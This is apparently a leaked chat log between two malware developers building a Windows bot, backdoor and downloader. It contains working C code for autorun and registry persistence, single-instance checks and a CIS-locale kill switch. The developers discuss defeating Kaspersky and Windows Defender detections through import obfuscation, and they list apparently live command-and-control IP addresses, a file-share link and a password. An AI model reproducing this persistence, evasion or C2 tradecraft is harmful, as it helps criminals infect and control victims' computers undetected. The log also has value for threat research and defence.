+And this circumstance I can not understand. I run the same bot on different machines (Windows 7 and Windows 10) - one is visible in the admin (the first), the second is not visible, although the NOP command comes to all machines.
+
+2020-07-17T12:50:21 mushroom -> frog
+Yes. With strings, it's like that. If unicode you have to copy lstrcpyW(sub_key, _WCS(L "Software\\\Microsoft\\\\Windows\\CurrentVersion\\Run")) to the buffer first
+
+2020-07-17T12:50:38 mushroom -> frog
+If ANSI does not need to be copied to an intermediate buffer.
+
+2020-07-17T12:52:39 mushroom -> frog
+_Success_(return != 0)
+BOOL addAutostart(_In_z_ PCWSTR linkName, _In_z_ PCTSTR targetFileName,
+    _In_opt_z_ PCTSTR description, _In_opt_z_ PCTSTR workingDir, _In_opt_z_ PCTSTR iconPath,
+    _In_opt_ int iconIndex)
+
+2020-07-17T12:52:48 mushroom -> frog
+Is this function what you mean?
+
+2020-07-17T12:53:02 frog -> mushroom
+Yes
+
+2020-07-17T12:53:13 mushroom -> frog
+What's not clear.
+
+2020-07-17T12:54:56 mushroom -> frog
+linjName shortcut name, targetFileName file name to which shortcut points, description description for shortcut, workingDir working folder for shortcut, iconPath icon file name for shortcut, iconIndex image index in ico file.
+
+2020-07-17T12:54:58 frog -> mushroom
+Tried this, but it didn't work:
+AddAutostart(L "link.exe", L "D:\\dl7.exe", L "My program", L "D:\\", 0, 0);
+And the last 2 parameters are not clear
+
+2020-07-17T12:55:11 mushroom -> frog
+That _opt_ can be NULL.
+
+2020-07-17T12:55:41 mushroom -> frog
+In fact, you only need the first two parameters.
+
+2020-07-17T12:56:00 mushroom -> frog
+Open the properties of any shortcut and see.
+
+2020-07-17T12:56:27 mushroom -> frog
+He will have all these parameters.
+
+2020-07-17T12:57:09 mushroom -> frog
+Work folder, icon, etc.
+
+2020-07-17T12:58:26 mushroom -> frog
+See the strings you passed first unicode, all others can be either unicode or ANSI.
+
+2020-07-17T12:58:49 mushroom -> frog
+What does your PCTSTR turn into?
+
+2020-07-17T12:59:00 mushroom -> frog
+In PCSTR or PCWSTR?
+
+2020-07-17T12:59:26 frog -> mushroom
+LPCWSTR
+
+2020-07-17T13:00:20 mushroom -> frog
+And what's the error?
+
+2020-07-17T13:00:30 mushroom -> frog
+What does GetLastError do?
+
+2020-07-17T13:00:49 mushroom -> frog
+And where? Where in this function?
+
+2020-07-17T13:01:44 mushroom -> frog
+You'll have both added to the registry and to autorun. Will only the one that started first work?
+
+2020-07-17T13:04:36 frog -> mushroom
+I figured it out. I had to specify the extension lnk. That's how it works:
+addAutostart(L "link1.lnk", L "D:\\dl7.exe", 0, 0, 0, 0);
+I wanted to do this: add to autostart. If I can't add it to autoloader, then to the registry.
+
+2020-07-17T13:05:23 mushroom -> frog
+You can do it this way. The main thing is that only one instance always works.
+
+2020-07-17T13:06:51 frog -> mushroom
+Tweaked the addAutostart function a bit. Inside it you also need to call "OLE32(CoInitialize)(NULL)", otherwise it doesn't work.
+
+2020-07-17T13:07:21 mushroom -> frog
+Yes you should. Not necessarily in it. It's better globally for the whole program.
+
+2020-07-17T13:08:54 frog -> mushroom
+Can you add both to the registry and autorun? How do you sync then?
+
+2020-07-17T13:14:13 mushroom -> frog
+Like this:
+#if defined(ONE_INSTANCE_FILE)
+    TCHAR homePath[MAX_PATH + 1];
+    kernel32.expandEnvironmentStrings(_TSTR(TEXT("%USERPROFILE%")), homePath, _countof(homePath));
+
+    TCHAR oneInstanceFilename[MAX_PATH + 1];
+    wsprintf(oneInstanceFilename, _TSTR(TEXT("%s\\\%s")), homePath, _TSTR(GLOBAL_APP_CHILD_ID));
+    HANDLE oneInstanceChildFile = kernel32.createFile(oneInstanceFilename, GENERIC_READ, 0, NULL,
+        OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY, NULL);
+    if (oneInstanceChildFile == INVALID_HANDLE_VALUE && kernel32.getLastError() == ERROR_FILE_NOT_FOUND)
+    {
+        debug_printf(TEXT("Child program is already running. Quit\n"));
+        waitForMessageBox();
+        return 1;
+    }
+
+    wsprintf(oneInstanceFilename, _TSTR(TEXT("%s\\\%s")), homePath, _TSTR(GLOBAL_APP_ID));
+    g_oneInstanceFile = kernel32.createFile(oneInstanceFilename, GENERIC_READ, 0, NULL,
+        CREATE_NEW, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
+        NULL);
+    if (g_oneInstanceFile == INVALID_HANDLE_VALUE && kernel32.getLastError() == ERROR_FILE_EXISTS)
+    {
+        debug_printf(TEXT("There is another instance of this program running already. Quit\n"));
+        waitForMessageBox();
+        return 1;
+    }
+#elif defined(ONE_INSTANCE_MUTEX)
+    HANDLE oneInstanceChildMutex = kernel32.createMutex(NULL, FALSE, _TSTR(GLOBAL_APP_CHILD_ID));
+    if (oneInstanceChildMutex)
+    {
+        if (kernel32.getLastError() == ERROR_ALREADY_EXISTS)
+        {
+            debug_printf(TEXT("Child program is already running. Quit\n"));
+            kernel32.closeHandle(oneInstanceChildMutex;)
+            waitForMessageBox();
+            return 1;
+        }
+
+        kernel32.closeHandle(oneInstanceChildMutex);
+    }
+
+    g_oneInstanceMutex = kernel32.createMutex(NULL, FALSE, _TSTR(GLOBAL_APP_ID));
+    if (g_oneInstanceMutex && kernel32.getLastError() == ERROR_ALREADY_EXISTS)
+    {
+        debug_printf(TEXT("There is another instance of this program running already. Quit\n"));
+        kernel32.closeHandle(g_oneInstanceMutex;)
+        waitForMessageBox();
+        return 1;
+    }
+#elif defined(ONE_INSTANCE_GLOBAL_ATOM)
+    ATOM childAtom = kernel32.globalFindAtom(_TSTR(GLOBAL_APP_CHILD_ID));
+    if (childAtom)
+    {
+        debug_printf(TEXT("Child program is already running. Quit\n"));
+#ifdef _DEBUG
+        kernel32.globalDeleteAtom(childAtom);
+#endif // _DEBUG
+        waitForMessageBox();
+        return 1;
+    }
+
+    g_oneInstanceAtom = kernel32.globalFindAtom(_TSTR(GLOBAL_APP_ID));
+    if (g_oneInstanceAtom)
+    {
+        debug_printf(TEXT("There is another instance of this program running already. Quit\n"));
+#ifdef _DEBUG
+        kernel32.globalDeleteAtom(g_oneInstanceAtom);
+#endif // _DEBUG
+        waitForMessageBox();
+        return 1;
+    }
+    else
+        g_oneInstanceAtom = kernel32.globalAddAtom(_TSTR(GLOBAL_APP_ID));
+#endif
+
+2020-07-17T13:14:48 mushroom -> frog
+The first way is to create a file and open it. The other program will get an error opening the file, so one version works already.
+
+2020-07-17T13:15:23 mushroom -> frog
+The second way to create a mutex, the second program will try to create a mutex and get an error that it already exists.
+
+2020-07-17T13:16:12 mushroom -> frog
+The third way is to add a variable to the globalatom table, the second try will read that this table already has it.
+
+2020-07-17T13:18:14 mushroom -> frog
+Do you write the log to a file in Release builds?
+
+2020-07-17T13:18:24 frog -> mushroom
+Yes
+
+2020-07-17T13:18:29 mushroom -> frog
+Did you check everything like I told you yesterday?
+
+2020-07-17T13:18:46 mushroom -> frog
+Does everything work smoothly?
+
+2020-07-17T13:20:46 frog -> mushroom
+I wrote above that I still need to find what antivirus reacts to in resolve_emercoin.h.
+The old resolve_emercoin.h has something dangerous (for antivirus) and it reacts on get_possible_domain too. Because if it's commented out, it's fine.
+
+2020-07-17T13:21:17 frog -> mushroom
+And this circumstance I can not understand. I run the same bot on different machines (Windows 7 and Windows 10) - one is visible in the admin (the first), the second is not visible, although the NOP command comes to all machines.
+
+2020-07-17T13:21:58 mushroom -> frog
+This is most likely because the group is not defined on the server.
+
+2020-07-17T13:22:12 mushroom -> frog
+On Win 10 Server can't you see it?
+
+2020-07-17T13:23:01 frog -> mushroom
+Regular Windows 10.
+
+2020-07-17T13:23:27 mushroom -> frog
+How do you transfer cookies?
+
+2020-07-17T13:24:18 frog -> mushroom
+m_lstrcpy(szHeaders, _STR("Cookie: group=" GROUP ";"))
+(!GET_API(HttpSendRequestA)(hHttpRequest, szHeaders, strlen(szHeaders), nullptr, 0))
+
+2020-07-17T13:24:57 frog -> mushroom
+#define GROUP "frog"
+
+2020-07-17T13:25:37 mushroom -> frog
+INTERNET_FLAG_NO_COOKIES do you use in httpOpenRequest?
+
+2020-07-17T13:25:52 mushroom -> frog
+If you don't use WinInet your cookies will be erased.
+
+2020-07-17T13:26:17 frog -> mushroom
+Yes
+HINTERNET hHttpRequest = GET_API(HttpOpenRequestA)(
+        hHttpSession, _STR("GET"), objectName,
+        _STR("HTTP/1.1"), nullptr, nullptr, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_COOKIES, (DWORD_PTR)0);
+
+2020-07-17T13:27:03 mushroom -> frog
+AND INTERNET_FLAG_SECURE?
+
+2020-07-17T13:27:11 mushroom -> frog
+You have to https
+
+2020-07-17T13:27:18 mushroom -> frog
+For the battle server.
+
+2020-07-17T13:28:20 mushroom -> frog
+You can try changing the id of the bot. You just might have run it before with a different group, and it was remembered on the server.
+
+2020-07-17T13:28:32 mushroom -> frog
+And that's why you can't see the bot.
+
+2020-07-17T13:28:51 mushroom -> frog
+Changing the id is simple. Change the creation date of the Windows folder a bit.
+
+2020-07-17T13:29:09 frog -> mushroom
+I see, thank you.
+
+2020-07-17T13:29:48 mushroom -> frog
+What's left to finish?
+
+2020-07-17T13:31:14 frog -> mushroom
+Basically deal with resolve_emercoin.h, obfuscate get_possible_domain.
+I'll add synchronization then.
+
+2020-07-17T13:32:01 mushroom -> frog
+Go for it. The priority is to remove these detects.
+
+2020-07-17T13:32:18 mushroom -> frog
+So you can give it to a tester for final testing.
+
+2020-07-17T13:33:28 frog -> mushroom
+Why is it possible that the same code is detected in the windows version, but not in the console version?
+
+2020-07-17T13:33:51 frog -> mushroom
+All other things being equal
+
+2020-07-17T13:34:41 mushroom -> frog
+So it's not all equal, or the antivirus sees that you're cheating, a windows application, and you don't show the window.
+
+2020-07-17T13:37:59 mushroom -> frog
+But I don't think all conditions are equal.
+
+2020-07-20T07:57:15 frog -> mushroom
+Hi!
+Uploaded the projects to gitlab.
+
+2020-07-20T08:12:19 frog -> mushroom
+Tested all programs on 2 systems: Windows 7 x64 and Windows 10 x64. Connected to the test server. On the live one I did not have time to check, but I guess everything must work, only ip-addresses need to be specified in config.h.
+In config.h I added the macro-identifier TEST_BUILD. If it is enabled, then the test version is compiled, otherwise the combat version is compiled.
+Under what names to be fixed in the system did not come up, but made it so that these names can be passed on the command line, for example:
+dl7.exe "name_in_registry" "name_in_autoload"
+I also wanted to deal with icons, but did not have time.
+
+2020-07-20T08:13:28 mushroom -> frog
+Hi. Will it stick if you don't provide names?
+
+2020-07-20T08:13:47 frog -> mushroom
+Yes, there are default names
+
+2020-07-20T08:14:15 mushroom -> frog
+Check on the battle server.
+lowers
+185.99.2.49
+78.108.216.13
+217.12.209.44
+91.235.129.151
+80.82.68.132
+62.108.35.215
+
+
+bot
+85.204.116.188
+80.82.68.32
+194.87.145.86
+185.14.31.135
+45.148.120.142
+62.109.13.184
+
+2020-07-20T08:14:36 mushroom -> frog
+If all goes well, I'll tell you who to give it to for testing.
+
+2020-07-20T08:14:49 mushroom -> frog
+Check with and without logs.
+
+2020-07-20T08:15:12 frog -> mushroom
+Okay. I.e. upload 2 sets to the battle server?
+
+2020-07-20T08:16:50 mushroom -> frog
+You can upload a version without logs there right away. So you will run the loader and the user will not notice anything. If you find any bugs, download with logs and see what's wrong.
+
+2020-07-20T10:03:57 mushroom -> frog
+How do you change your bot's id?
+
+2020-07-20T10:05:52 frog -> mushroom
+In systeminfo.cpp on line 56 you can add any number to a second or a minute
+
+2020-07-20T10:09:47 mushroom -> frog
+The Release build connects to the test server.
+
+2020-07-20T10:09:57 mushroom -> frog
+Gotta get to the fighter.
+
+2020-07-20T10:11:45 frog -> mushroom
+Ok. You can comment out the line with TEST_BUILD in config.h, then it will connect to combat.
+
+2020-07-20T10:12:19 mushroom -> frog
+It should always be like this, the tester will check on the battle server. To commit it.
+
+2020-07-20T10:17:26 mushroom -> frog
+The version of the bot and the loader must be flashed in the same way as the group in the programs.
+
+2020-07-20T10:20:04 mushroom -> frog
+More. When connecting to a server, after checking it. It is necessary to send a message specifying the version of the program and the address used at the moment. POST /<id>/4 with the message body. Like Version 0.1 Address 255.255.255.255.255.
+
+2020-07-20T10:20:52 mushroom -> frog
+If reconnection occurs, also a message indicating the address used.
+
+2020-07-20T10:22:02 mushroom -> frog
+Every hour of work, you need to send a message which specifies the time the bot worked. Like Uptime 3600000 msec.
+
+2020-07-20T10:22:54 mushroom -> frog
+cname ???
+
+2020-07-20T10:23:12 mushroom -> frog
+When getting information about the system.
+
+2020-07-20T10:24:22 mushroom -> frog
+ip three addresses. The first is external, and what do the second and third mean?
+
+2020-07-20T10:25:33 frog -> mushroom
+Which pgethostbyname returns.
+
+2020-07-20T10:26:10 mushroom -> frog
+Are these local addresses like that?
+
+2020-07-20T10:26:27 frog -> mushroom
+Yes
+
+2020-07-20T10:26:54 mushroom -> frog
+You don't need them in principle. Leave it like that for now.
+
+2020-07-20T10:26:57 mushroom -> frog
+cname ???
+
+2020-07-20T10:27:08 mushroom -> frog
+The computer name is undefined.
+
+2020-07-20T10:28:02 mushroom -> frog
+Or it was sent with an error. So instead of it ???
+
+2020-07-20T10:28:33 frog -> mushroom
+I'll see if something happened to the coding.
+
+2020-07-20T10:28:54 mushroom -> frog
+Hollowing 32 -> 64 works?
+
+2020-07-20T10:29:19 frog -> mushroom
+No.
+
+2020-07-20T10:29:46 mushroom -> frog
+Leave it like that for now.
+
+2020-07-20T10:30:06 frog -> mushroom
+I doubt it's even possible.
+
+2020-07-20T10:30:06 frog -> mushroom
+I doubt it's even possible.
+
+2020-07-20T10:30:29 mushroom -> frog
+Maybe. I gave you the processhelper example.
+
+2020-07-20T10:31:05 mushroom -> frog
+It will be like a refinement later. Right now the main thing is to fix the bugs.
+
+2020-07-20T10:31:18 frog -> mushroom
+You can run 32-bit from 64-bit
+
+2020-07-20T10:31:41 mushroom -> frog
+That's what I meant.
+
+2020-07-20T10:32:04 frog -> mushroom
+It's done
+
+2020-07-20T10:32:52 mushroom -> frog
+Antivirus only Windows Defender is never detected by me.
+
+2020-07-20T10:33:33 mushroom -> frog
+Standart Output
+Standart Error
+ERROR.
+Description: Incorrect namespace
+
+2020-07-20T10:33:46 mushroom -> frog
+It's written where the antivirus is.
+
+2020-07-20T10:34:02 frog -> mushroom
+I recognize the antivirus this way:
+wmic /namespace:\\root\SecurityCenter path AntivirusProduct get displayName, versionNumber /format:list
+
+2020-07-20T10:34:50 mushroom -> frog
+When you tested on Win 10 was the antivirus detected?
+
+2020-07-20T10:35:52 frog -> mushroom
+Didn't check that command. I'll take a look now.
+
+2020-07-20T10:36:15 mushroom -> frog
+95% of where your program will work is Win 10 64bit.
+
+2020-07-20T10:41:15 frog -> mushroom
+Doesn't work either
+
+2020-07-20T10:41:26 mushroom -> frog
+Solve the question.
+
+2020-07-20T10:42:14 mushroom -> frog
+Regarding the 3 addresses, still need to remove and leave 1. And then the server, when the 3 address country icon does not display in the admin.
+
+2020-07-20T10:42:26 mushroom -> frog
+You should only leave the external one.
+
+2020-07-20T10:43:22 mushroom -> frog
+Did I give you an example of how to get a system antivirus?
+
+2020-07-20T10:43:36 mushroom -> frog
+I think I gave it at the beginning.
+
+2020-07-20T10:47:23 frog -> mushroom
+Yes, there is a function "ANTIVIRUSINFOLIST antivirusInfo()"
+
+2020-07-20T10:47:40 frog -> mushroom
+In info.cpp.
+
+2020-07-20T11:05:20 mushroom -> frog
+Running powershell\cmd check this script cd c:\\r\ndir\r\n, I ended up with not the contents of the C:\ disk, but the contents of the program folder.
+
+2020-07-20T11:05:41 mushroom -> frog
+This is running from memory without saving the script to disk.
+
+2020-07-20T11:06:25 mushroom -> frog
+How do you run the script from memory via pip?
+
+2020-07-20T11:10:26 frog -> mushroom
+Of course
+
+2020-07-20T11:10:43 mushroom -> frog
+cd c:\\r\ndir\r\n try this one.
+
+2020-07-20T11:11:59 mushroom -> frog
+It turns out that the two commands are executed separately, not one after the other.
+
+2020-07-20T11:12:34 mushroom -> frog
+Let me check on my bot.
+
+2020-07-20T11:15:51 mushroom -> frog
+I have a C:\ drive and the contents are displayed.
+
+2020-07-20T11:15:59 mushroom -> frog
+Look where you have an error.
+
+2020-07-20T11:16:34 mushroom -> frog
+You get the same even when you do a script run with save to disk.
+
+2020-07-20T11:17:36 frog -> mushroom
+The command should be: "c:\r\ndir\r\n".
+
+2020-07-20T11:18:05 mushroom -> frog
+And the one that can't be cd c:\r\ndir\r\n
+
+2020-07-20T11:18:20 mushroom -> frog
+What if I need to change a pack.
+
+2020-07-20T11:18:26 mushroom -> frog
+Folder.
+
+2020-07-20T11:19:33 frog -> mushroom
+cd to another local drive does not switch
+
+2020-07-20T11:20:01 mushroom -> frog
+Let me check with my D:\ drive.
+
+2020-07-20T11:21:12 mushroom -> frog
+It works.
+
+2020-07-20T11:21:24 mushroom -> frog
+You have an error somewhere.
+
+2020-07-20T11:23:58 mushroom -> frog
+In PowerShell it switches to another drive, in cmd it does not.
+
+2020-07-20T11:24:11 mushroom -> frog
+Your PowerShell doesn't work either.
+
+2020-07-20T11:25:20 mushroom -> frog
+And if you don't switch to another drive, the commands don't go down the chain as well, as they should.
+
+2020-07-20T11:25:34 mushroom -> frog
+See what the snag is.
+
+2020-07-20T11:30:09 mushroom -> frog
+When the terminate process command failed, do you send an error code in the response?
+
+2020-07-20T11:31:46 mushroom -> frog
+When successfully looking send Process_successful_terminate:. Also, put there what GetLastError will give, even if it was successful. It will then be 0. Or just send only number that GetLastError gives, you can not write anything else.
+
+2020-07-20T11:34:42 mushroom -> frog
+Everything else is fine. Looked it up.
+
+2020-07-21T08:45:56 frog -> mushroom
+Hi. Uploaded the backdoor project to gitlab. Fixed yesterday's comments. Had a little trouble with the antivirus.
+I will make a few tweaks to the downloader and upload it later.
+
+2020-07-21T08:56:48 mushroom -> frog
+Hi. Okay.
+
+2020-07-21T10:38:30 frog -> mushroom
+When the downloader started to connect to the battle server, Kaspersky antivirus started showing "Trojan-Downloader.Win32.Upatre".
+This did not happen with the test one. In general, I'm figuring it out.
+
+2020-07-21T10:39:21 mushroom -> frog
+OK. Maybe his address is blacklisted.
+
+2020-07-21T13:35:50 frog -> mushroom
+Is the long list of IP addresses in the resolve_emercoin module up to date?
+
+2020-07-21T13:36:34 mushroom -> frog
+Maybe not anymore.
+
+2020-07-21T13:39:04 frog -> mushroom
+Should I leave it like that for now? Or can they be checked somehow?
+In the ToR it says "immediate rejection when working in the zone .ru/CIS - cut on the backend; also check the presence of Russian layout.
+How to implement this?
+
+2020-07-21T13:39:52 mushroom -> frog
+Check your keyboard layouts and system language.
+
+2020-07-21T13:41:13 mushroom -> frog
+BOOL isLangForbidden(LANGID lang)
+{
+    UCHAR primaryLang = lang & 0xff;
+    //UCHAR subLanguage = (lang >> 2) & 0xff;
+
+    switch (primaryLang)
+    {
+    case LANG_RUSSIAN:
+    case LANG_AZERBAIJANI:
+    case LANG_ARMENIAN:
+    case LANG_BELARUSIAN:
+    case LANG_KAZAK:
+    case LANG_KYRGYZ:
+    case LANG_ROMANIAN:
+    case LANG_TAJIK:
+    case LANG_UZBEK:
+    case LANG_GEORGIAN:
+    case LANG_UKRAINIAN:
+    case LANG_TURKMEN:
+        return TRUE;
+    }
+
+    return FALSE;
+}
+
+BOOL forbiddenLocale()
+{
+    BOOL result = FALSE;
+
+    LANGID sysDefaultLang = kernel32.getSystemDefaultLangID();
+    result = isLangForbidden(sysDefaultLang);
+    if (!result)
+    {
+        int hklCount = user32.getKeyboardLayoutList(0, NULL);
+        HKL* hklList = (HKL*)HeapAlloc(GetProcessHeap(), 0, hklCount * sizeof(HKL));
+        if (hklList)
+        {
+            user32.getKeyboardLayoutList(hklCount, hklList);
+            for (int i = 0; i < hklCount && !result; ++i)
+                result = isLangForbidden(*((WORD*)(&hklList[i])) & 0xffff);
+
+            HeapFree(GetProcessHeap(), 0, hklList);
+        }
+    }
+
+    return result;
+}
+
+2020-07-21T14:30:08 frog -> mushroom
+The info.h module has calls from Api-ms-win-core-version-l1-1-0.dll. Do you want to obfuscate them too?
+
+2020-07-21T14:30:38 mushroom -> frog
+No.
+
+2020-07-21T14:30:42 frog -> mushroom
+This is to get the exe file version of the antivirus
+
+2020-07-21T14:31:01 mushroom -> frog
+Or you can make up your own version.
+
+2020-07-21T15:09:16 frog -> mushroom
+"is suspected of Trojan.Downloader.gen.s" - what could it be?
+
+2020-07-21T15:09:50 mushroom -> frog
+Is this for the bootloader?
+
+2020-07-21T15:13:16 mushroom -> frog
+The function or sequence of functions in the program that downloads and saves the file most likely.
+
+2020-07-21T15:13:23 frog -> mushroom
+Bot sometimes shows up (it's a static check on dyncheck.com, VBA32 antivirus). And somehow strangely: sometimes it shows, sometimes not. I comment out some random line that does not relate to anything at all, or write unnecessary - detection will disappear. Then it appears again.
+
+2020-07-21T15:14:13 mushroom -> frog
+The sequence of functions is probably typical for this antivirus.
+
+2020-07-21T15:14:19 mushroom -> frog
+Is this for x64?
+
+2020-07-21T15:14:40 frog -> mushroom
+No, for x86.
+
+2020-07-21T15:15:31 mushroom -> frog
+No such thing for x64?
+
+2020-07-21T15:15:47 frog -> mushroom
+No
+
+2020-07-21T15:15:59 mushroom -> frog
+If not, leave it for now, x64 use it.
+
+2020-07-21T15:25:27 frog -> mushroom
+Didn't have time to finish the loader. Took me a long time to catch one detection. Kaspersky Anti-Virus did not like CoCreateInstance call to create shortcut in autoloader. I had to figure out how to replace the call to this function.
+The names of references in the registry and the autoloader, I should probably write in config.h
+
+2020-07-21T15:30:13 mushroom -> frog
+Antiviruses don't like programs that go into the autorun.
+
+2020-07-21T15:36:41 frog -> mushroom
+I uploaded the current version of the loader to gitlab. Later I will add language check and check the bootloader on Windows 10
+
+2020-07-21T15:37:50 mushroom -> frog
+Okay.
+
+2020-07-22T11:02:32 mushroom -> frog
+Hi. System info, my system is identified as Win 8 and I have Win 10.
+
+2020-07-23T05:57:56 mushroom -> frog
+Hi. System info, my system is identified as Win 8 and I have Win 10.
+
+2020-07-23T08:39:02 mushroom -> frog
+Hi. I looked at everything yesterday and it seems to be working. Did you finish everything?
+
+2020-07-23T08:51:37 frog -> mushroom
+Hi. Uploaded both projects to gitlab. Fixed the OS version definition. Added localization definition. Fixed some bugs and detects.
+
+2020-07-23T08:53:23 mushroom -> frog
+Prepare versions with and without logs. And give it to bentley for testing.
+
+2020-07-23T08:53:32 mushroom -> frog
+Add it to yourself.
+
+2020-07-23T08:53:41 frog -> mushroom
+I have it.
+
+2020-07-23T08:53:54 mushroom -> frog
+It will test on different machines with different antiviruses.
+
+2020-07-23T08:54:02 mushroom -> frog
+Then give it to him.
+
+2020-07-23T08:54:44 mushroom -> frog
+From now on, every new build increases the version that is flashed in the bot and loader.
+
+2020-07-23T11:16:22 mushroom -> frog
+Gave up the bentley?
+
+2020-07-23T11:16:45 mushroom -> frog
+When you give it to me, tell me.
+
+2020-07-23T11:24:13 frog -> mushroom
+Retrieved
+
+2020-07-23T11:25:47 mushroom -> frog
+OK. It will tell you what detects were (if any), fix it. And if any errors will pop up. We need to have no detections from the antiviruses he will check your kit with.
+
+2020-07-28T10:50:35 mushroom -> frog
+Hi. What's up with the testing?
+
+2020-07-28T10:51:48 frog -> mushroom
+Hi. Waiting for the results. Bentley hasn't responded yet.
+
+2020-07-28T10:54:15 mushroom -> frog
+Did you check the dynamics on dyncheck?
+
+2020-07-28T10:55:27 frog -> mushroom
+Didn't check it. Only did a static check.
+
+2020-07-28T10:55:37 mushroom -> frog
+The only thing you need to check there is the lowader.
+
+2020-07-28T10:56:00 mushroom -> frog
+Check it out, then tell me what's up.
+
+2020-07-28T10:56:50 frog -> mushroom
+I'm running out of time there(
+I didn't know there was a limit
+
+2020-07-28T10:57:34 mushroom -> frog
+How so? We have the same account, I check.
+
+2020-07-28T10:57:48 mushroom -> frog
+And if you go through a proxy.
+
+2020-07-28T11:20:22 frog -> mushroom
+Checked the 32-bit version. 6 antiviruses reacted negatively. Some say Gen:Variant.Fugrafa.68463
+
+2020-07-28T11:21:48 mushroom -> frog
+See the details of what they write. There's probably half of them reacting negatively to the fact that a program on the internet doesn't count.
+
+2020-07-28T11:24:24 frog -> mushroom
+https://dyncheck.com/scan/id/820a6c6c61889af6e2683da13f0e065d
+
+2020-07-28T11:28:38 mushroom -> frog
+Fine in principle. Waiting then, when, the admin panel will be fixed to there already finally test with antiviruses, which we are interested.
+
+2020-07-28T11:28:56 mushroom -> frog
+You can look up what fugrafa means in the meantime.
+
+2020-07-28T11:30:16 frog -> mushroom
+Okay. I already had him. Tried to catch it. Only noticed that it appears when the main function body is empty or there are irrelevant instructions.
+
+2020-07-29T08:22:55 mushroom -> frog
+Hi, what's on the test?
+
+2020-07-29T08:23:45 frog -> mushroom
+Hi. Nothing has been reported yet.
+
+2020-07-29T08:29:02 mushroom -> frog
+What are the backdoor and bootloader addresses there now?
+
+2020-07-29T08:35:32 frog -> mushroom
+Backdoor
+85.204.116.188
+80.82.68.32
+194.87.145.86
+185.14.31.135
+45.148.120.142
+62.109.13.184
+
+2020-07-29T08:36:14 frog -> mushroom
+Downloader
+185.99.2.49
+217.12.209.44
+91.235.129.151
+80.82.68.132
+62.108.35.215
+78.108.216.13
+
+2020-07-29T08:39:08 mushroom -> frog
+OK. Basically all live addresses.
+
+2020-07-29T14:16:46 mushroom -> frog
+My Windows Defender immediately gobbled up your dl7.exe
+
+2020-07-29T14:16:56 mushroom -> frog
+x86
+
+2020-07-29T14:17:14 mushroom -> frog
+#unWhM}yn|~h6d3N
+
+2020-07-29T14:17:22 mushroom -> frog
+VirTool:Win32/Obfuscator.QV
+
+2020-07-29T14:17:38 mushroom -> frog
+The version without logs.
+
+2020-07-29T14:18:31 frog -> mushroom
+Okay. I'll take a look.
+
+2020-07-29T14:20:51 mushroom -> frog
+inet_ntop
+inet_pton
+
+2020-07-29T14:21:00 mushroom -> frog
+Remove from import.
+
+2020-07-29T14:21:08 mushroom -> frog
+This is for dl7
+
+2020-07-29T14:23:25 frog -> mushroom
+I think I removed it a long time ago. Maybe you're watching some old version?
+
+2020-07-29T14:24:13 mushroom -> frog
+Yeah. Sorry about the old one.
+
+2020-07-29T14:25:26 mushroom -> frog
+Ole32 remove from import.
+
+2020-07-29T14:25:49 mushroom -> frog
+CoGetClassObject
+
+2020-07-29T14:26:05 mushroom -> frog
+She's the only one there in your dl7 import
+
+2020-07-29T14:31:18 mushroom -> frog
+Everything else is properly obfuscated.
+
+2020-07-29T14:58:50 frog -> mushroom
+This is what I got today:
+32-bit version of the bootloader:
+https://dyncheck.com/scan/id/15a2bc6c34388e5318dde882b4220567
+64-bit version of the bootloader:
+https://dyncheck.com/scan/id/1aed5c6380af122bbbf8d0b89939d96f
+
+2020-07-29T15:00:38 mushroom -> frog
+That's a good one. Strange that 32 has no firewall detections. Does it work, download and run the bot?
+
+2020-07-29T15:01:21 mushroom -> frog
+And 64 has them.
+
+2020-07-29T15:03:47 frog -> mushroom
+On my machine, it downloads and runs. But on dyncheck I don't know, I check unlogged versions, I don't see the console.
+
+2020-07-29T15:04:21 mushroom -> frog
+Okay. Did the imports take out ole32?
+
+2020-07-29T15:04:41 frog -> mushroom
+Removed
+
+2020-07-29T15:05:34 mushroom -> frog
+Update the addresses.
+
+2020-07-29T15:05:36 mushroom -> frog
+lowers
+31.214.240.203
+78.108.216.13
+195.123.240.6
+194.5.249.163
+80.82.68.132
+62.108.35.215
+
+
+bot
+85.204.116.188
+80.82.68.32
+194.5.249.164
+185.14.31.135
+45.148.120.142
+62.109.13.184
+
+2020-07-29T15:06:12 mushroom -> frog
+And assemble and give Bentley (with logs\without logs) the whole kit.
+
+2020-07-29T15:08:51 frog -> mushroom
+Okay. He's probably checking out that set, right? He asked me for the ID generator today.
+
+2020-07-29T15:09:24 mushroom -> frog
+Gonna. While he's checking mine out. You'll still have time to give a new one.
+
+2020-07-30T13:22:38 mushroom -> frog
+Hi send Buse the id generator for the bot.
+
+2020-07-30T13:23:10 frog -> mushroom
+Okay. I'll do it now.
+
+2020-07-30T13:24:29 mushroom -> frog
+Do it through qaz.im.
+
+2020-07-31T09:26:00 mushroom -> frog
+Do you have a CMake project so you can compile MinGW looder and bot?
+
+2020-07-31T09:26:20 frog -> mushroom
+No
+
+2020-07-31T09:26:52 mushroom -> frog
+Do it while they test your kit.
+
+2020-07-31T09:27:48 mushroom -> frog
+Clang is still needed, but it's already integrated into Visual Studio. And you'll get 3 versions of MSVC, Clang and MinGW to work with at once.
+
+2020-07-31T15:05:28 frog -> mushroom
+Can I see some example of a Cmake project?
+
+2020-07-31T15:57:44 mushroom -> frog
+I'll send it to you right away.
+
+2020-07-31T16:00:35 mushroom -> frog
+Download: https://qaz.im/load/QiGbaG/sSA8NQ
+Delete: https://qaz.im/index.php?a=delete&q=562805300
+Password: $$|Kg`COgZG=$(NR3
+
+2020-07-31T16:01:42 mushroom -> frog
+This is an example project for a bot. Modify it to fit your files.
+
+2020-08-04T07:54:10 mushroom -> frog
+Hi, did Bentley write to you?
+
+2020-08-04T07:54:11 mushroom -> frog
+<bentley> on 7 worked completely on 10 and 2019 didn't work at all. And the logs didn't show up.
+[10:53:47] <bentley> When running a version with logs
+
+2020-08-04T07:54:19 mushroom -> frog
+This is your set.
+
+2020-08-04T08:02:11 mushroom -> frog
+Figure it out. Keep me in the loop.
+
+2020-08-05T08:28:03 mushroom -> frog
+Hi. So how is it working on Win 10 and Server 2019?
+
+2020-08-05T08:34:48 frog -> mushroom
+Hi, I'm figuring it out, looking for bugs. It worked on Windows 10.
+
+2020-08-05T08:50:09 mushroom -> frog
+OK.
+
+2020-08-05T12:29:38 frog -> mushroom
